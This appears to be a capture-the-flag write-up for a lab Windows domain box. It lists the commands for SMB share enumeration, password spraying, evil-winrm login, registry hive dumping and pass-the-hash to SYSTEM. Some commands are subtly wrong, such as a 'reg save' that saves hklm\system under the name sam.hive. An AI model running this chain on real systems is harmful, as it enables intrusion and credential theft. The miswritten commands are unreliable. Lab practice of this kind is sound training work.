
![[cicada logo.png]]



![Pasted image 20251020214434](Images/Pasted%20image%2020251020214434.png)

We enumerate the readable smb share with netcrackexec (nxc)

```
nxc smb "10.129.203.139" --shares
```
We got an access denied so we specify the user anonymous (guest)

```
nxc smb "10.129.203.139" -u 'anonymous' p '' --shares
```
![Pasted image 20251020214724](Images/Pasted%20image%2020251020214724.png)

Ok so HR Share is readable, lets go see what's inside

![Pasted image 20251020214820](Images/Pasted%20image%2020251020214820.png)

We found a note that says the default password is **Cicada$M6Corpb*@Lp#nZp!8**

Let's Enumerate the user with the tool from impacket **lookupsid.py**

```
lookupsid.py Anonymous@"10.129.203.139"
```

![Pasted image 20251020215025](Images/Pasted%20image%2020251020215025.png)

We make a valid list out of the resulat

```
lookupsid.py Anonymous@"10.129.203.139" | grep User | sed -E 's/^[^:]+: ([^ ]+).*/\1/' > list.txt
```

![Pasted image 20251020215323](Images/Pasted%20image%2020251020215323.png)

We remove the Domain, and we use nxc again to find a valid user

```
nxc smb "10.129.203.139" -u 'user.txt' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![Pasted image 20251020215930](Images/Pasted%20image%2020251020215930.png)

So the valid user is **michael.wrightson**

After trying psexec.py, our user has no writeable share...
So let's get back witch nxc to find something else with our creds

```
nxc smb "10.129.203.139" -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![Pasted image 20251020220325](Images/Pasted%20image%2020251020220325.png)

Well looks like david put his password into his description :)

david.orelious:aRt$Lp#7t*VQ!3

We enumerate the shares for this user 

![Pasted image 20251020220708](Images/Pasted%20image%2020251020220708.png)

We now got access to DEV share

```
smbclient //10.129.203.139/DEV --user 'david.orelious'
```

![Pasted image 20251020220755](Images/Pasted%20image%2020251020220755.png)

We get the script inside and look what's inside it

![Pasted image 20251020220828](Images/Pasted%20image%2020251020220828.png)

Another combo user:password !

emily.oscars:Q!3@Lp#M6b*7t*Vt

![Pasted image 20251020220923](Images/Pasted%20image%2020251020220923.png)

![Pasted image 20251020221543](Images/Pasted%20image%2020251020221543.png)

We can winrm to the target so we will use evil winrm

```
evil-winrm -u "emily.oscars" -p 'Q!3@Lp#M6b*7t*Vt' -i "10.129.203.139"
```

![Pasted image 20251020221632](Images/Pasted%20image%2020251020221632.png)

We get the flag located in Desktop/user.txt



## Privesc


After doing the command

```
whoami /priv
```
We see that we have SeBackupPrivilege And SeRestorePrivilege enable

It meens that we can copy the reg hive of SAM and SYSTEM

First we copy the 2 hives

```
reg save hklm\system C:\Windows\Temp\system.hive
```
```
reg save hklm\system C:\Windows\Temp\sam.hive
```

Then, we use the download feature in evil-winrm to retrieve the 2 files

![Pasted image 20251020222930](Images/Pasted%20image%2020251020222930.png)

And finaly we use the tool secretsdump from impacket to get the **hash** of the local account.

![Pasted image 20251020223046](Images/Pasted%20image%2020251020223046.png)

And to finish, we use the pass the hashe technique on psexec.py to connect as system on the target

![Pasted image 20251020223234](Images/Pasted%20image%2020251020223234.png)

We go to the administrator/desktop folder and this conclude our box 

